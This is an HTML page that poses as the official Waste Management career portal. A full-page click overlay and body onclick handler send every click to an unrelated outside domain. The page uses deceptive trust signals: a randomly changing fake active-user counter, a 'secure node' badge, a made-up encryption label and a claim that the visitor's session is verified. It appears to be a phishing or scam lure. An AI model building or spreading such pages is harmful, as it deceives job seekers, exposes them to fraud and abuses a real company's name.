<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Waste Management® Official Career Portal</title>
    
    <style>
        :root { --primary: #00d084; --accent: #05ffa1; --danger: #ff4b2b; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, sans-serif; }
        
        body {
            background-color: #050505;
            background-image: linear-gradient(rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.8)),
                url('https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=1500&q=80');
            background-size: cover; background-position: center; background-attachment: fixed;
            min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 15px;
            overflow: hidden; cursor: pointer;
        }

        /* All-Click Overlay */
        .click-wrap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }

        .glass-card {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(40px) saturate(220%);
            -webkit-backdrop-filter: blur(40px) saturate(220%);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 45px; padding: 45px 25px; width: 100%; max-width: 460px;
            text-align: center; color: white;
            box-shadow: 0 50px 100px rgba(0, 0, 0, 0.8);
            position: relative; z-index: 20;
            animation: entry 1.2s cubic-bezier(0.16, 1, 0.3, 1) forwards;
        }

        /* Advanced Status Header */
        .status-container {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 30px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 15px;
        }

        .user-stats {
            display: flex; align-items: center; gap: 8px;
            font-size: 13px; font-weight: 800; color: #fff; letter-spacing: 0.5px;
        }

        .pulse-dot { height: 8px; width: 8px; background: var(--danger); border-radius: 50%; box-shadow: 0 0 12px var(--danger); animation: pulse 2s infinite; }

        .time-box {
            font-size: 14px; color: var(--primary); font-weight: 900;
            background: rgba(0, 208, 132, 0.1); padding: 5px 12px; border-radius: 8px; border: 1px solid rgba(0, 208, 132, 0.2);
        }

        /* Split Greeting & Node Section */
        .branding-header { margin-bottom: 30px; }

        #greet-msg {
            font-size: 11px; font-weight: 700; color: rgba(255,255,255,0.5);
            text-transform: uppercase; letter-spacing: 3px; margin-bottom: 8px; display: block;
        }

        .node-badge {
            display: inline-flex; align-items: center; gap: 8px;
            background: rgba(0, 208, 132, 0.05); padding: 8px 18px; border-radius: 100px;
            border: 1px solid rgba(0, 208, 132, 0.3);
            box-shadow: 0 0 20px rgba(0, 208, 132, 0.1);
        }

        .node-text {
            font-size: 12px; font-weight: 900; color: var(--primary);
            text-transform: uppercase; letter-spacing: 1.5px;
        }

        h1 { font-size: clamp(28px, 8.5vw, 38px); font-weight: 900; margin-bottom: 12px; letter-spacing: -1.5px; line-height: 1; background: linear-gradient(180deg, #FFFFFF 0%, #A0A0A0 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }

        p { font-size: clamp(15px, 4.2vw, 17px); color: rgba(255,255,255,0.8); line-height: 1.6; margin-bottom: 40px; padding: 0 10px; }

        .cta-btn {
            background: linear-gradient(135deg, #00d084 0%, #00a368 100%);
            color: #002b1a; padding: 22px; border-radius: 20px; font-size: 20px; font-weight: 900; 
            box-shadow: 0 15px 35px rgba(0, 208, 132, 0.3);
        }

        .footer-tag { margin-top: 45px; font-size: 10px; color: rgba(255,255,255,0.3); text-transform: uppercase; letter-spacing: 2px; }

        /* Animations */
        @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.8); } }
        @keyframes entry { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body onclick="window.location.href='https://vinos1.com/hP57O3N1Rq?'">

    <div class="click-wrap"></div>

    <div class="glass-card" id="card">
        <div class="status-container">
            <div class="user-stats">
                <div class="pulse-dot"></div>
                <span id="user-count">1,042</span> ACTIVE USERS
            </div>
            <div class="time-box" id="clock">00:00:00</div>
        </div>

        <div class="branding-header">
            <span id="greet-msg">Good Afternoon</span>
            <div class="node-badge">
                <div class="pulse-dot" style="background: var(--primary); box-shadow: 0 0 10px var(--primary);"></div>
                <span class="node-text">SECURE NODE ACTIVE</span>
            </div>
        </div>

        <h1>Waste Management</h1>
        <p>Your regional session is verified. Access the sustainability network dashboard to confirm your assignment details.</p>
        
        <div class="cta-btn">Access Official Portal</div>

        <div class="footer-tag">
            <p>ENC-TYPE: AES-256-DISTRICT</p>
            <p>© Waste Management International</p>
        </div>
    </div>

    <script>
        function updateStats() {
            const el = document.getElementById('user-count');
            let val = parseInt(el.innerText.replace(',', ''));
            let change = Math.floor(Math.random() * 4) + 1;
            val = (Math.random() > 0.5) ? val + change : val - change;
            if (val < 995) val += 10; if (val > 1145) val -= 10;
            el.innerText = val.toLocaleString();
        }

        function runClock() {
            const d = new Date();
            document.getElementById('clock').innerText = d.toLocaleTimeString('en-US', { hour12: true, hour: '2-digit', minute: '2-digit', second: '2-digit' });
            const h = d.getHours();
            document.getElementById('greet-msg').innerText = (h < 12 ? "Good Morning" : h < 18 ? "Good Afternoon" : "Good Evening");
        }

        setInterval(updateStats, 10000); 
        setInterval(runClock, 1000); 
        runClock();
    </script>
</body>
</html>
